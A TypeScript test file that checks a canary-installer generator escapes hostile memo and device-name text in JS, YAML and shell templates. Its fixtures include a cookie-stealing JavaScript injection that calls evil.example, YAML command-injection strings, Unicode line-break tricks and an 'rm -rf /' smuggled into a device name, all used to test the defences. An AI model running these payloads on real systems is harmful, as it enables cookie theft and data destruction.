import { describe, expect, it } from "vitest";
import { buildInstaller, templateSafeText } from "@mantis/core/installers";
import { buildDeviceBundleFiles } from "@mantis/core/device-bundle-files";
import { getVector } from "@mantis/core/device-profiles";

// A memo is free text (≤500 chars) that lands inside generated code. Nothing
// in it may terminate the enclosing comment / line / quoted string.

const base = {
  url: "https://mantis.example/c/abc123",
  keyId: "00000000-0000-0000-0000-000000000000",
};
const hostile = "*/ document.location='https://evil.example/?c='+document.cookie; /*";

describe("installer templates neutralise hostile memos", () => {
  it.each(["js-clone-detector", "css-background", "scrypted"] as const)(
    "%s keeps the memo inside the comment block",
    (type) => {
      const benign = buildInstaller(type, { ...base, memo: "benign", hostname: "example.com" });
      const out = buildInstaller(type, { ...base, memo: hostile, hostname: "example.com" });
      // A hostile memo must not add a single comment terminator: the count
      // of `*/` is exactly what the template itself contains.
      const count = (s: string) => s.split("*/").length - 1;
      expect(count(out.content)).toBe(count(benign.content));
      // …and the payload text is still there, defanged, inside the comment.
      expect(out.content).toContain("* / document.location");
    },
  );

  it("home-assistant YAML quotes the alias and keeps memo newlines out of the file", () => {
    const memo = 'x"\n    actions:\n      - action: shell_command.evil\n    #';
    const out = buildInstaller("homeassistant-receiver", { ...base, memo });
    expect(out.content).not.toContain("shell_command.evil\n");
    const alias = out.content.split("\n").find((l) => l.includes("alias:"))!;
    expect(alias).toContain('alias: "Mantis hit — x\\"');
    expect(out.content.match(/^\s*actions:/gm)).toHaveLength(1);
  });

  it.each(["nfc-ndef", "homeassistant"] as const)("%s keeps # comments single-line", (type) => {
    const out = buildInstaller(type, { ...base, memo: "a\nrest_command: evil\nb" });
    expect(out.content).not.toMatch(/^rest_command: evil$/m);
  });

  it("a hostile hostname cannot close the JS comment either", () => {
    const benign = buildInstaller("js-clone-detector", { ...base, memo: "m", hostname: "example.com" });
    const out = buildInstaller("js-clone-detector", { ...base, memo: "m", hostname: "*/ alert(1) /*" });
    expect(out.content).not.toContain("*/ alert");
    expect(out.content.split("*/")).toHaveLength(benign.content.split("*/").length);
    // What is left after hostname normalisation is inert, and quoted.
    expect(out.content).toContain('var expected = "*";');
  });

  it("templateSafeText collapses control characters", () => {
    expect(templateSafeText("a\r\nb\tc\x00d")).toBe("a b c d");
  });

  // YAML 1.1 loaders (PyYAML / libyaml, i.e. Home Assistant) end a line at
  // NEL, LS and PS as well as at CR/LF. A memo carrying one would otherwise
  // close the `#` comment it sits in and continue as top-level YAML.
  const UNICODE_BREAKS = [0x85, 0x2028, 0x2029];
  const yamlLines = (s: string) => s.split(/\r\n|[\n\r\x85]|\p{Zl}|\p{Zp}/u);

  it("templateSafeText collapses C1 controls and Unicode line/paragraph separators", () => {
    const [nel, ls, ps] = UNICODE_BREAKS.map((cp) => String.fromCharCode(cp));
    expect(templateSafeText(`a${nel}b${ls}c${ps}d\x80e\x9ff`)).toBe("a b c d e f");
    // Ordinary non-ASCII text is untouched.
    expect(templateSafeText("café — naïve ½ 日本")).toBe("café — naïve ½ 日本");
  });

  it.each(["homeassistant", "homeassistant-receiver", "nfc-ndef"] as const)(
    "%s keeps YAML 1.1 line breaks (NEL/LS/PS) in the memo out of the file",
    (type) => {
      const benign = buildInstaller(type, { ...base, memo: "a rest_command: evil", webhookId: "w" });
      for (const cp of UNICODE_BREAKS) {
        const memo = `a${String.fromCharCode(cp)}rest_command: evil`;
        const out = buildInstaller(type, { ...base, memo, webhookId: "w" });
        expect(out.content).not.toMatch(/[\x85\p{Zl}\p{Zp}]/u);
        expect(yamlLines(out.content).filter((l) => l.startsWith("rest_command: evil"))).toEqual([]);
        // The separator became a space: same file as a memo with a space.
        expect(out.content).toBe(benign.content);
      }
    },
  );

  it("device bundle scripts treat Unicode line breaks in the device name the same way", () => {
    const vector = getVector("linux", "boot")!;
    for (const cp of UNICODE_BREAKS) {
      const files = buildDeviceBundleFiles({
        deviceName: `web01${String.fromCharCode(cp)}rm -rf /`,
        os: "linux",
        vectors: [
          {
            vector,
            key: { id: base.keyId, publicId: "abc123", memo: "m" },
            installer: buildInstaller(vector.installType, { ...base, memo: "m" }),
          },
        ],
      });
      for (const content of Object.values(files.files)) {
        expect(content).not.toMatch(/[\x85\p{Zl}\p{Zp}]/u);
      }
      expect(files.files["install.sh"]).toContain("# Device : web01 rm -rf /\n");
    }
  });

  it("device bundle scripts keep a multi-line device name inside the comment", () => {
    const vector = getVector("linux", "boot")!;
    const files = buildDeviceBundleFiles({
      deviceName: "web01\nrm -rf /",
      os: "linux",
      baseUrl: "https://mantis.example",
      vectors: [
        {
          vector,
          key: { id: base.keyId, publicId: "abc123", memo: "m" },
          installer: buildInstaller(vector.installType, { ...base, memo: "m" }),
        },
      ],
    });
    expect(files.files["install.sh"]).not.toMatch(/^rm -rf \/$/m);
  });
});
